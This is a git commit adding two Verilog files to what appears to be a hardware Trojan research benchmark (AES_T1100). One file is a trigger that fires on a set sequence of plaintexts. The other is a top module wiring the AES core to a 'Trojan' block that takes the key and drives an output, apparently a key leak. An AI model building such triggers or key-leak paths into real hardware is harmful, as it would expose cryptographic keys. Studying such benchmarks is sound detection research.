5b3e60ac7bbbbb86aa28f0535deea0fb535318a6
Weiqing Ni <724330304@qq.com>
2016-02-25 22:25:13 +0800

    Add AES_T1100
    Signed-off-by: Weiqing Ni <724330304@qq.com>

---
+++ Vivado/AES_T1100/AES_T1100.srcs/sources_1/imports/AES_T1100/Trojan_Trigger.v
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg State0, State1, State2, State3;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 <= 0;
+			State1 <= 0;
+			State2 <= 0;
+			State3 <= 0; 
+		end else if (state == 128'h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 <= 1;
+		end else if ((state == 128'h00112233_44556677_8899aabb_ccddeeff) && (State0 == 1)) begin
+			State1 <= 1;
+		end else if ((state == 128'h0) && (State1 == 1)) begin
+			State2 <= 1;
+		end else if ((state == 128'h1) && (State2 == 1)) begin
+			State3 <= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig <= State0 & State1 & State2 & State3;
+	end
+
+endmodule
---
+++ Vivado/AES_T1100/AES_T1100.srcs/sources_1/imports/AES_T1100/top.v
@@ -0,0 +1,62 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company:
+// Engineer:
+//
+// Create Date:    12:02:52 03/06/2013
+// Design Name:
+// Module Name:    top
+// Project Name:
+// Target Devices:
+// Tool versions:
+// Description:
+//
+// Dependencies:
+//
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    output [7:0] res);
+    reg [63:0] state;
+    reg [63:0] key;
+    reg [63:0] result;
+    wire [63:0] Capacitance;
+
+    wire [63:0] statew;
+    wire [63:0] keyw;
+
+    wire [127:0] statebi;
+    wire [127:0] keybi;
+    wire [127:0] out;
+
+	wire Tj_Trig;
+    always @(posedge clk)
+    begin
+      state <= 64'd0;
+      key <= 64'd0;;
+    end
+
+    assign statew = state;
+    assign keyw = key;
+
+    bufferin bi(.clk(clk)
+    ,.statein(statew)
+    ,.keyin(keyw)
+    ,.stateout(statebi)
+    ,.keyout(keybi));
+
+	aes_128 AES (clk, statebi, keybi, out);
+	Trojan_Trigger Trigger (rst, statebi, Tj_Trig);
+	TSC Trojan (rst, clk, Tj_Trig, keybi, state, Capacitance);
+
+    bufferout bo(.clk(clk)
+      ,.resultin(out)
+      ,.capin(Capacitance)
+      ,.resultout(res));
+
+endmodule
